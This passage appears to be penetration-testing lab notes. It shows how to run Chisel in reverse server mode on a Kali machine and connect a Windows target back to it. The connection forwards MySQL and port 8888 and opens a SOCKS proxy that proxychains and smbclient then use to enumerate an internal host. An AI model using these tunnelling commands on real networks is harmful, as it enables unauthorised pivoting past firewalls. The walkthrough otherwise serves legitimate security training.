Now we’ll start up Chisel in server mode, since we want the Windows box to connect back to us.  
`./chisel server --reverse --port 9002`

Then on the Windows machine, you’ll run a command similar to the one below. The following command will instruct Chisel to connect back to the Kali machine on port 9002. Once connected, we’ll forward any traffic sent to port localhost port 3306 to port 3306 on the Windows machine. The 2nd entry does the same thing, but for port 8888.  
`.\chisel.exe client **<kaliIP>**:9002 R:3306:localhost:3306 R:8888:localhost:8888`

Now we can confirm that we’re able to connect to port 3306 of the Windows machine, through the tunnel, from the Kali machine.  
`nc localhost 3306`


```
chisel server -p 1080 --reverse

.\chisel.exe client 10.250.1.6:1080 R:1081:socks

socks5 127.0.0.1 1081

proxychains smbclient -L 10.200.150.10
